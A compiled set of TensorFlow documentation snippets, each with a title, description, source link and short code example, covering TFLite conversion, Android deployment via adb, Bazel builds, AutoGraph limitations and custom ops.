SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/python_api.md#_snippet_1

LANGUAGE: python
CODE:
```
# Print trainable variable parameter statistics to stdout.
ProfileOptionBuilder = tf.profiler.ProfileOptionBuilder

param_stats = tf.profiler.profile(
    tf.get_default_graph(),
    options=ProfileOptionBuilder.trainable_variables_parameter())

# Use code view to associate statistics with Python codes.
opts = ProfileOptionBuilder(
    ProfileOptionBuilder.trainable_variables_parameter()
    ).with_node_names(show_name_regexes=['.*my_code1.py.*', '.*my_code2.py.*']
    ).build()
param_stats = tf.profiler.profile(
    tf.get_default_graph(),
    cmd='code',
    options=opts)

# param_stats can be tensorflow.tfprof.GraphNodeProto or
# tensorflow.tfprof.MultiGraphNodeProto, depending on the view.
# Let's print the root below.
sys.stdout.write('total_params: %d\n' % param_stats.total_parameters)
```

----------------------------------------

TITLE: Installing TFLite Benchmark App and Pushing Model on Android - Shell
DESCRIPTION: Installs the TensorFlow Lite benchmark application APK onto a connected Android device using `adb install` and pushes the TFLite model file to a designated directory (`/data/local/tmp`) on the device using `adb push`. These steps are prerequisites for running the benchmark app on the device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/measurement.md#_snippet_0

LANGUAGE: Shell
CODE:
```
adb install -r -d -g android_aarch64_benchmark_model.apk
adb push your_model.tflite /data/local/tmp
```

----------------------------------------

TITLE: Cross-Build TFLite Pip with Bazel - armhf Python 3.7 (Shell)
DESCRIPTION: Employs the `ci_build.sh` script with the `PI-PYTHON37` profile to configure a Docker build environment. It then runs the `build_pip_package_with_bazel.sh` script within Docker, specifically targeting the `armhf` architecture for Python 3.7.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_9

LANGUAGE: sh
CODE:
```
tensorflow/tools/ci_build/ci_build.sh PI-PYTHON37 \
  tensorflow/lite/tools/pip_package/build_pip_package_with_bazel.sh armhf
```

----------------------------------------

TITLE: Correcting Python Loop by Starting as TF Loop Python
DESCRIPTION: Provides the correct approach for the previous example by ensuring the loop variable (`i`) starts as a TensorFlow tensor (`tf.constant`). This allows AutoGraph to convert the entire loop into TensorFlow control flow from the beginning, enabling the use of TensorFlow operations within the loop body.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_48

LANGUAGE: Python
CODE:
```
i = tf.constant(10)  # works
while i > 0:
  i = tf.math.subtract(i, 1)
```

----------------------------------------

TITLE: Converting Float GraphDef with Dummy Quantization to Quantized INT8 TFLite
DESCRIPTION: This command demonstrates converting a standard float GraphDef to an INT8 TFLite model using 'dummy-quantization' for performance estimation. It uses `--default_ranges_min` and `--default_ranges_max` to supply estimated min/max ranges for tensors lacking this information, allowing quantization to proceed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_5

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --graph_def_file=/tmp/mobilenet_v1_0.50_128/frozen_graph.pb \
  --output_file=/tmp/foo.tflite \
  --input_arrays=input \
  --output_arrays=MobilenetV1/Predictions/Reshape_1 \
  --inference_type=INT8 \
  --mean_values=-0.5 \
  --std_dev_values=127.7 \
  --default_ranges_min=0 \
  --default_ranges_max=6
```

----------------------------------------

TITLE: Converting Jax Model to TFLite Python
DESCRIPTION: Demonstrates using the experimental `experimental_from_jax` method to convert a Jax model representation, specified by functions and inputs, into a TensorFlow Lite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TFLiteConverter.md#_snippet_4

LANGUAGE: python
CODE:
```
# Converting a Jax model to a TensorFlow Lite model.
converter = tf.lite.TFLiteConverter.experimental_from_jax([func], [[
    ('input1', input1), ('input2', input2)]])
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Push Demo Files to Android Device via ADB
DESCRIPTION: Transfers the built label_image binary, downloaded TFLite model, labels, and sample image from the host machine to the /data/local/tmp directory on a connected Android device using the Android Debug Bridge (ADB). Requires ADB to be installed and the device connected.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_6

LANGUAGE: shell
CODE:
```
adb push bazel-bin/tensorflow/lite/examples/label_image/label_image  /data/local/tmp
adb push /tmp/mobilenet_v1_1.0_224.tflite  /data/local/tmp
adb push tensorflow/lite/examples/label_image/testdata/grace_hopper.bmp  /data/local/tmp
adb push /tmp/labels.txt /data/local/tmp
```

----------------------------------------

TITLE: Implementing Multiplexer Kernel Using Eigen Selection in C++
DESCRIPTION: Shows an alternative, more efficient implementation of the core kernel logic using Eigen's `select` function. This method is vectorized and can leverage multi-threading for better performance compared to a manual loop.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_6

LANGUAGE: c++
CODE:
```
output = cond.select(a_values, b_values);
```

----------------------------------------

TITLE: Registering GPU Kernels for Multiplex Op (C++)
DESCRIPTION: Registers the kernel implementation for the custom operation specifically for the GPU device. It uses a macro to define and register the kernel for a range of supported data types (T) using the `REGISTER_KERNEL_BUILDER` macro and associating it with the templated `MultiplexDenseOp` class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_2

LANGUAGE: cpp
CODE:
```
#define REGISTER_KERNELS_GPU(type)                              \
  REGISTER_KERNEL_BUILDER(Name("Examples>MultiplexDense")       \
                              .Device(::tensorflow::DEVICE_GPU) \
                              .TypeConstraint<type>("T"),       \
                          MultiplexDenseOp<GPUDevice, type>)

REGISTER_KERNELS_GPU(bool);
REGISTER_KERNELS_GPU(Eigen::half);
REGISTER_KERNELS_GPU(float);
REGISTER_KERNELS_GPU(double);
REGISTER_KERNELS_GPU(int64);
REGISTER_KERNELS_GPU(complex64);
REGISTER_KERNELS_GPU(complex128);

#undef REGISTER_KERNELS_GPU
```

----------------------------------------

TITLE: Initializing TensorFlow Lite TargetSpec Python
DESCRIPTION: This snippet shows the constructor signature for the `tf.lite.TargetSpec` class in TensorFlow Lite. It is used to create an object specifying the target device's capabilities, which influences model optimization by defining supported operators, data types, and experimental backends like 'GPU'. The parameters allow detailed configuration of the target environment for the TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TargetSpec.md#_snippet_0

LANGUAGE: python
CODE:
```
tf.lite.TargetSpec(
    supported_ops=None,
    supported_types=None,
    experimental_select_user_tf_ops=None,
    experimental_supported_backends=None
)
```

----------------------------------------

TITLE: Initializing QuantizationDebugOptions Class (Python)
DESCRIPTION: Defines the constructor for the `tf.lite.experimental.QuantizationDebugOptions` class. It takes optional parameters including dictionaries for defining custom layer-specific or model-wide debug metrics, lists for specifying operations or nodes to be denylisted from quantization, and a boolean flag to enable full model quantization. This constructor initializes an object used to configure the behavior of the QuantizationDebugger tool.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/experimental/QuantizationDebugOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
tf.lite.experimental.QuantizationDebugOptions(
    layer_debug_metrics: Optional[Mapping[str, Callable[[np.ndarray], float]]] = None,
    model_debug_metrics: Optional[Mapping[str, Callable[[Sequence[np.ndarray], Sequence[np.ndarray]],
        float]]] = None,
    layer_direct_compare_metrics: Optional[Mapping[str, Callable[[Sequence[np.ndarray], Sequence[np.ndarray],
        float, int], float]]] = None,
    denylisted_ops: Optional[List[str]] = None,
    denylisted_nodes: Optional[List[str]] = None,
    fully_quantize: bool = False
) -> None
```

----------------------------------------

TITLE: Calling Keras Dense Layer with TF NumPy Input
DESCRIPTION: Creates a standard Keras Dense layer and calls it with input provided as a TensorFlow NumPy ND Array. Demonstrates that Keras layers can accept ND Array inputs, which are internally converted to `tf.Tensor`, while the layer itself outputs a `tf.Tensor`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Keras_and_Distribution_Strategy.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
dense_layer = tf.keras.layers.Dense(5)
inputs = tnp.random.randn(2, 3).astype(tnp.float32)
outputs = dense_layer(inputs)
print("Shape:", outputs.shape)
print("Class:", outputs.__class__)
```

----------------------------------------

TITLE: Performing Classification with NLClassifier in Python
DESCRIPTION: Documents the `classify` method of the `NLClassifier` class. This method takes a single string parameter `text` as input. It performs natural language classification on the provided text and returns a `ClassificationResult` object. It may raise `ValueError` or `RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/NLClassifier.md#_snippet_1

LANGUAGE: python
CODE:
```
classify(
    text: str
) -> tflite_support.task.processor.ClassificationResult
```

----------------------------------------

TITLE: Creating TFLite ImageSearcher from Options Python
DESCRIPTION: Creates an ImageSearcher instance using a comprehensive ImageSearcherOptions object. This method allows detailed configuration of the searcher's behavior. Returns a configured ImageSearcher object or raises ValueError/RuntimeError if options are invalid or creation fails.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSearcher.md#_snippet_2

LANGUAGE: Python
CODE:
```
@classmethod
create_from_options(
    options: tflite_support.task.vision.ImageSearcherOptions
) -> 'ImageSearcher'
```

----------------------------------------

TITLE: Building TensorFlow Java and JNI with Bazel (Shell)
DESCRIPTION: Configures and builds the TensorFlow Java library (`libtensorflow.jar`) and its corresponding native JNI library (`libtensorflow_jni.so`, `.dylib`, or `.dll`) from source using Bazel. This requires a configured TensorFlow source tree and the Bazel build tool.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/java/LEGACY.md#_snippet_1

LANGUAGE: Shell
CODE:
```
./configure
bazel build --config opt \
  //tensorflow/java:tensorflow \
  //tensorflow/java:libtensorflow_jni
```

----------------------------------------

TITLE: Creating MetadataDisplayer from Model File in Python
DESCRIPTION: Defines the class method signature for `with_model_file`. This alternative constructor creates a `MetadataDisplayer` object by loading the TFLite model from a specified file path. It returns the initialized instance or raises `IOError` if the file is not found or `ValueError` if the model lacks metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataDisplayer.md#_snippet_6

LANGUAGE: python
CODE:
```
@classmethod
with_model_file(
    model_file
)
```

----------------------------------------

TITLE: Conditional Variable Definition (One Branch) - Correct
DESCRIPTION: If a variable defined conditionally (with a `tf.Tensor` condition) is not used after the control flow statement, it is considered local and not subject to the restriction requiring definition in all branches. This snippet is okay because 'x' is not used after the `if/else` block.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_3

LANGUAGE: python
CODE:
```
del x
if tf.random.uniform(()) > 0.5:
  x = tf.constant(1)  # Okay -- x does not need to be returned from the TF cond
else:
  pass
```

----------------------------------------

TITLE: Build TensorFlow Lite Library (CMake)
DESCRIPTION: Executes the build process within the CMake build directory (`tflite_build`) to compile the configured TensorFlow Lite library and related targets. The `-j` flag instructs CMake to use multiple parallel jobs for faster compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_17

LANGUAGE: sh
CODE:
```
cmake --build . -j
```

----------------------------------------

TITLE: Printing Quantized TFLite Model Size (Python)
DESCRIPTION: Retrieves the file size of the saved quantized TFLite model using `os.path.getsize`, converts it to megabytes by right-shifting (equivalent to integer division by 2^20), and prints the result. This provides information about the size reduction achieved by quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/quantization/stablehlo/python/integration_test/stablehlo_quantizer_odml_oss.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
print(str(os.path.getsize('/tmp/resnet50_quantized.tflite') >> 20) + 'MB')
```

----------------------------------------

TITLE: Configuring SlurmClusterResolver Advanced - Python
DESCRIPTION: Illustrates advanced configuration of the `SlurmClusterResolver` by explicitly setting parameters like job distribution (e.g., parameter servers and workers), base port, tasks and GPUs per node/task, and disabling automatic GPU setting. It also shows how to retrieve the generated cluster specification and the current task's information.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/distribute/cluster_resolver/README_Slurm.md#_snippet_1

LANGUAGE: python
CODE:
```
cluster_resolver = tf.contrib.cluster_resolver.SlurmClusterResolver( {'ps': 1, 'worker': 3},
 port_base=1337, tasks_per_node=2, gpus_per_node=2, gpus_per_task=1,
 auto_set_gpu=False)

cluster = cluster_resolver.cluster_spec()
job_name, task_index = cluster_resolver.get_task_info()
```

----------------------------------------

TITLE: Apply obfuscate_names Transform (Bash)
DESCRIPTION: This snippet demonstrates building and executing the `transform_graph` tool to apply the `obfuscate_names` transform. This transform replaces most node names in the graph with short, cryptic but unique IDs to reduce the graph file size, particularly useful for models with many small nodes. The example correctly specifies the input and output nodes with their index (`:0`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_6

LANGUAGE: bash
CODE:
```
bazel build tensorflow/tools/graph_transforms:transform_graph
bazel-bin/tensorflow/tools/graph_transforms/transform_graph \
--in_graph=tensorflow_inception_graph.pb \
--out_graph=optimized_inception_graph.pb \
--inputs='Mul:0' \
--outputs='softmax:0' \
--transforms='
  obfuscate_names'
```

----------------------------------------

TITLE: Cloning TensorFlow Repository (Bash)
DESCRIPTION: Clones the official TensorFlow source code repository from GitHub into a new local directory named `tensorflow_src`. This is the first step in the Bazel cross-compilation process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_arm.md#_snippet_0

LANGUAGE: bash
CODE:
```
git clone https://github.com/tensorflow/tensorflow.git tensorflow_src
```

----------------------------------------

TITLE: Upgrading Directory using tf_upgrade_v2 (Shell)
DESCRIPTION: Shows how to apply the `tf_upgrade_v2` script to an entire directory tree. It upgrades `.py` files found within the `--intree` path and copies all other files to the new `--outtree` directory by default. Requires the TensorFlow pip package.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/compatibility/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
tf_upgrade_v2 --intree coolcode --outtree coolcode-upgraded
```

----------------------------------------

TITLE: Remove Unused Nodes to Fix Missing Kernels (Bash)
DESCRIPTION: This command uses `strip_unused_nodes` and other transforms to remove portions of the graph not required for inference. This is a common solution to resolve 'No OpKernel was registered' errors on mobile or other environments where not all TensorFlow kernels are included, by eliminating training-specific or unreachable operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_3

LANGUAGE: bash
CODE:
```
bazel build tensorflow/tools/graph_transforms:transform_graph
bazel-bin/tensorflow/tools/graph_transforms/transform_graph \
--in_graph=tensorflow_inception_graph.pb \
--out_graph=optimized_inception_graph.pb \
--inputs='Mul' \
--outputs='softmax' \
--transforms='
  strip_unused_nodes(type=float, shape="1,299,299,3")
  fold_constants(ignore_errors=true)
  fold_batch_norms
  fold_old_batch_norms
'
```

----------------------------------------

TITLE: Performing Input Space-to-Depth Transform Python
DESCRIPTION: This Python snippet shows the logic for performing a space-to-depth transformation on the input tensor (`images`). It reshapes and transposes the tensor to move spatial dimensions (`block_size`) into the channel dimension, which is equivalent to `tf.nn.space_to_depth` and makes the input more suitable for optimized convolution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/space_to_depth.md#_snippet_0

LANGUAGE: Python
CODE:
```
images = tf.reshape(images, [batch, h // block_size, block_size,
                               w // block_size, block_size, c])
images = tf.transpose(images, [0, 1, 3, 2, 4, 5])
images = tf.reshape(images, [batch, h // block_size, w // block_size,
                               c * (block_size ** 2)])
```

----------------------------------------

TITLE: Generate CPU Subgraph Alternative - TFLite/MLIR
DESCRIPTION: Defines an alternative MLIR function (@func_2_CPU_FLOAT) generated for the "CPU". It demonstrates the use of the tfl.pack operation, which is supported natively or efficiently on the CPU device for consolidating tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_9

LANGUAGE: MLIR
CODE:
```
 func private @func_2_CPU_FLOAT(%arg0: tensor<1xf32>, %arg1: tensor<1xf32>) -> tensor<2x1xf32> attributes {tac.device = "CPU", tac.inference_type = "FLOAT", tac.interface_name = "func_2"} {
    %0 = "tfl.pack"(%arg0, %arg1) {axis = 0 : i32, tac.device = "CPU", tac.inference_type = "FLOAT", values_count = 2 : i32} : (tensor<1xf32>, tensor<1xf32>) -> tensor<2x1xf32>
    return %0 : tensor<2x1xf32>
  }
```

----------------------------------------

TITLE: Exporting Only Label File - Python
DESCRIPTION: Exports only the label file associated with the trained image classification model to the specified directory. This is useful if you only need the label mapping for your application without the model file itself. Requires a trained model object and the ExportFormat enum.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
model.export(export_dir='.', export_format=ExportFormat.LABEL)
```

----------------------------------------

TITLE: Add TFLite Swift Nightly Pod (Ruby)
DESCRIPTION: Specifies the dependency on the TensorFlowLiteSwift pod using the nightly build version constraint in the Podfile.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_3

LANGUAGE: Ruby
CODE:
```
pod 'TensorFlowLiteSwift', '~> 0.0.1-nightly'
```

----------------------------------------

TITLE: Demonstrating Invariant Assumption with tf.py_function - TensorFlow Python
DESCRIPTION: Shows how a change made to a Python list `n` inside a `tf.py_function` is not reflected in the `if` condition (`tf.equal(n[0], 10)`) when the graph is traced, because the Python value `n[0]` is treated as an invariant during tracing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_2

LANGUAGE: Python
CODE:
```
n = [10]
def f():
  n[0] = 20
  return 0
tf.py_function(f, (), (tf.int32,))
if tf.equal(n[0], 10):
  tf.print('n is 10')
```

----------------------------------------

TITLE: Enabling XLA Auto-clustering on CPU Shell
DESCRIPTION: Shell command to enable XLA auto-clustering for both GPU and CPU workloads. It requires setting multiple flags in `TF_XLA_FLAGS`. Note that CPU auto-clustering support is currently experimental.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_8

LANGUAGE: Shell
CODE:
```
$ TF_XLA_FLAGS="--tf_xla_auto_jit=2 --tf_xla_cpu_global_jit" path/to/your/program
```

----------------------------------------

TITLE: Defining Non-Replicated TPU Computation MLIR
DESCRIPTION: Example showing a non-replicated TensorFlow TPU computation in MLIR dialect. It includes `tf.TPUReplicateMetadata`, `tf.TPUReplicatedInput`, `tf.Identity`, and `tf.TPUReplicatedOutput` operations within a function, representing the structure before the clustering pass.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_46

LANGUAGE: mlir
CODE:
```
func @tpu_computation(%arg0: tensor<i32>) -> tensor<i32> {
  // Metadata op for cluster `cluster` with 1 replica, 1 core per replica and
  // with topology `<topology>`.
  "tf.TPUReplicateMetadata"() {_xla_compile_device_type = "TPU", _replication_info = "cluster", num_relicas = 1, num_cores_per_replica = 1, topology = "<topology>", device_assignment = [], padding_map = []} : () -> ()
  %replicated_input = "tf.TPUReplicatedInput"(%arg0) : (tensor<i32>) -> tensor<i32>
  %identity = "tf.Identity"(%replicated_input) {_xla_compile_device_type = "TPU", _replication_info = "cluster"} : (tensor<i32>) -> tensor<i32>
  %replicated_output = "tf.TPUReplicatedOutput"(%identity) : (tensor<i32>) -> tensor<i32>
  return %replicated_output : tensor<i32>
}
```

----------------------------------------

TITLE: Creating Inference Metadata Writer (TFLite Support, Python)
DESCRIPTION: Creates mandatory metadata for TFLite Support inference features (Task library, Codegen). It requires the model buffer, tokenizer information (Bert or SentencePiece), and label file paths. The `ids_name`, `mask_name`, and `segment_name` parameters help identify input tensors, defaulting to Model Maker conventions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/bert_nl_classifier/MetadataWriter.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_for_inference(
    model_buffer: bytearray,
    tokenizer_md: Union[<a href="../../../tflite_support/metadata_writers/metadata_info/BertTokenizerMd"><code>tflite_support.metadata_writers.metadata_info.BertTokenizerMd</code></a>, <a href="../../../tflite_support/metadata_writers/metadata_info/SentencePieceTokenizerMd"><code>tflite_support.metadata_writers.metadata_info.SentencePieceTokenizerMd</code></a>],
    label_file_paths: List[str],
    ids_name: str = _DEFAULT_ID_NAME,
    mask_name: str = _DEFAULT_MASK_NAME,
    segment_name: str = _DEFAULT_SEGMENT_ID_NAME
)
```

----------------------------------------

TITLE: Starting Audio Recording in Python
DESCRIPTION: Describes the method used to begin the audio recording process. This method initiates the capturing of audio data into the internal buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioRecord.md#_snippet_2

LANGUAGE: python
CODE:
```
start_recording() -> None
```

----------------------------------------

TITLE: Initializing ValueRangeT Class (Python)
DESCRIPTION: Constructor for the `ValueRangeT` class. Use this to create a new instance of the value range object, typically used for representing a numerical range within TFLite metadata structures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRangeT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ValueRangeT()
```

----------------------------------------

TITLE: Build TensorFlow Lite Demo for Android ARMv7a
DESCRIPTION: Builds the TensorFlow Lite C++ label_image example for Android devices with ARMv7a architecture using Bazel. Requires configuring the Android NDK. The '--config=android_arm' flag targets 32-bit ARM.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_3

LANGUAGE: shell
CODE:
```
bazel build -c opt --config=android_arm \
  //tensorflow/lite/examples/label_image:label_image
```

----------------------------------------

TITLE: Executing Android Binary via ADB Shell - Shell
DESCRIPTION: Shows the shell command to execute the pushed Android binary on the device using ADB shell.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_11

LANGUAGE: Shell
CODE:
```
adb shell /data/local/tmp/op_name_test
```

----------------------------------------

TITLE: Illegal Inconsistent Dtype in tf.cond Error Python
DESCRIPTION: Demonstrates an error in TensorFlow graph execution where a `tf.cond` attempts to return tensors with inconsistent data types (`tf.int32` and `tf.float32`) from its branches. Dtypes must be consistent across all control flow paths. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_39

LANGUAGE: Python
CODE:
```
x = tf.cond(
    tf.random.uniform(()) > 0.5,
    lambda: tf.constant(1, dtype=tf.int32),
    lambda: tf.constant(1, dtype=tf.float32))  # Error -- inconsistent dtypes: int32, float32
```

----------------------------------------

TITLE: Collect High RMSE Layer Tensor Names Python
DESCRIPTION: Creates a Python list containing the `tensor_name` values for layers identified from the filtered pandas DataFrame as having an 'rmse/scale' greater than 0.7. This list can be used as input for subsequent selective quantization steps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_14

LANGUAGE: Python
CODE:
```
suspected_layers = list(
    layer_stats[layer_stats['rmse/scale'] > 0.7]['tensor_name'])
```

----------------------------------------

TITLE: Compiling TensorFlow Custom Op Library (Bazel BUILD)
DESCRIPTION: Defines a Bazel BUILD file configuration to compile the C++ source files (`simple_hash_table_kernel.cc`, `simple_hash_table_op.cc`) into a shared library (`simple_hash_table_kernel.so`) and create Python wrapper libraries (`simple_hash_table_op`, `simple_hash_table`) for the custom TensorFlow hash table op, specifying dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_14

LANGUAGE: Bazel
CODE:
```
tf_custom_op_library(
    name = "simple_hash_table_kernel.so",
    srcs = [
        "simple_hash_table_kernel.cc",
        "simple_hash_table_op.cc",
    ],
    deps = [
        "//third_party/absl/container:flat_hash_map",
        "//third_party/tensorflow/core/lib/gtl:map_util",
        "//third_party/tensorflow/core/platform:strcat",
    ],
)

py_strict_library(
    name = "simple_hash_table_op",
    srcs = ["simple_hash_table_op.py"],
    data = ["simple_hash_table_kernel.so"],
    srcs_version = "PY3",
    deps = [
        "//third_party/py/tensorflow",
    ],
)

py_strict_library(
    name = "simple_hash_table",
    srcs = ["simple_hash_table.py"],
    srcs_version = "PY3",
    deps = [
        ":simple_hash_table_op",
        "//third_party/py/tensorflow",
    ],
)
```

----------------------------------------

TITLE: Generating TensorFlow Timeline with TFProf
DESCRIPTION: This tfprof command generates a timeline file capturing memory usage across different operations and time steps. It requires `--graph_path` and `--run_meta_path` to be provided when launching tfprof. The generated file can be loaded into Chrome's `chrome://tracing` for visualization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_memory.md#_snippet_0

LANGUAGE: tfprof
CODE:
```
#To get memory information, you need --graph_path and --run_meta_path
tfprof> graph -max_depth 10000000 -step 0 -account_type_regexes .* -output timeline:outfile=<filename>
```

----------------------------------------

TITLE: Initializing StaticHashTable (string->int64) from File - Python
DESCRIPTION: Shows how to initialize a tf.lookup.StaticHashTable mapping strings to int64s using a vocabulary read from a file. It reads words from '/tmp/vocab.file', creates a KeyValueTensorInitializer, initializes the table, creates a placeholder for string input, and defines the lookup operation with table initialization dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/hashtable.md#_snippet_1

LANGUAGE: Python
CODE:
```
with open('/tmp/vocab.file', 'r') as f:
  words = f.read().splitlines()

string_values = tf.constant(words, dtype=tf.string)

initializer = tf.lookup.KeyValueTensorInitializer(string_values, int64_values)
table = tf.lookup.StaticHashTable(initializer, 4)

with tf.control_dependencies([tf.initializers.tables_initializer()]):
  input_string_tensor = tf.placeholder(tf.string, shape=[1])
  out_int66_tensor = table.lookup(input_string_tensor)
```

----------------------------------------

TITLE: Import Required Python Libraries
DESCRIPTION: Imports essential Python libraries needed for various stages of the tutorial, including data manipulation (pandas, numpy, csv), file system operations (os, sys, tempfile), visualization (matplotlib, cv2), machine learning frameworks (tensorflow, tensorflow_hub, keras), and model evaluation tools (sklearn).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_1

LANGUAGE: Python
CODE:
```
import csv
import cv2
import itertools
import numpy as np
import pandas as pd
import os
import sys
import tempfile
import tqdm

from matplotlib import pyplot as plt
from matplotlib.collections import LineCollection

import tensorflow as tf
import tensorflow_hub as hub
from tensorflow import keras

from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix
```

----------------------------------------

TITLE: Signature for Custom Checkpoint Save Function in Python
DESCRIPTION: Specifies the expected signature for a custom `save_fn` used with `register_checkpoint_saver`. It receives a dictionary of trackable objects and the file prefix, and should return a list of saved shard filenames.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/saved_model/registration/README.md#_snippet_2

LANGUAGE: python
CODE:
```
@tf.function  # optional decorator
def save_fn(trackables, file_prefix): -> List[shard filenames]
```

----------------------------------------

TITLE: Defining Bazel Rule for Custom C Shared Object (Bazel BUILD)
DESCRIPTION: This Bazel BUILD file snippet defines a rule to create a custom C shared object for TensorFlow Lite. It first defines a selective C library using `tflite_custom_c_library` for specific models and then wraps it in a shared object using `tflite_cc_shared_object`, including platform-specific link options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_4

LANGUAGE: bazel
CODE:
```
load(
    "//tensorflow/lite:build_def.bzl",
    "tflite_custom_c_library",
    "tflite_cc_shared_object",
)

tflite_custom_c_library(
    name = "selectively_built_c_lib",
    models = [
        ":model_one.tflite",
        ":model_two.tflite",
    ],
)

# Generates a platform-specific shared library containing the TensorFlow Lite C
# API implementation as define in `c_api.h`. The exact output library name
# is platform dependent:
#   - Linux/Android: `libtensorflowlite_c.so`
#   - Mac: `libtensorflowlite_c.dylib`
#   - Windows: `tensorflowlite_c.dll`
tflite_cc_shared_object(
    name = "tensorflowlite_c",
    linkopts = select({
        "//tensorflow:ios": [
            "-Wl,-exported_symbols_list,$(location //tensorflow/lite/c:exported_symbols.lds)",
        ],
        "//tensorflow:macos": [
            "-Wl,-exported_symbols_list,$(location //tensorflow/lite/c:exported_symbols.lds)",
        ],
        "//tensorflow:windows": [],
        "//conditions:default": [
            "-z defs",
            "-Wl,--version-script,$(location //tensorflow/lite/c:version_script.lds)",
        ],
    }),
    per_os_targets = True,
    deps = [
        ":selectively_built_c_lib",
        "//tensorflow/lite/c:exported_symbols.lds",
        "//tensorflow/lite/c:version_script.lds",
    ],
)
```

----------------------------------------

TITLE: Pushing Android Binary via ADB - Shell
DESCRIPTION: Provides the shell command to transfer the built Android binary to a connected device's temporary directory using ADB.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_10

LANGUAGE: Shell
CODE:
```
adb push shlo/ops/op_name_test /data/local/tmp
```

----------------------------------------

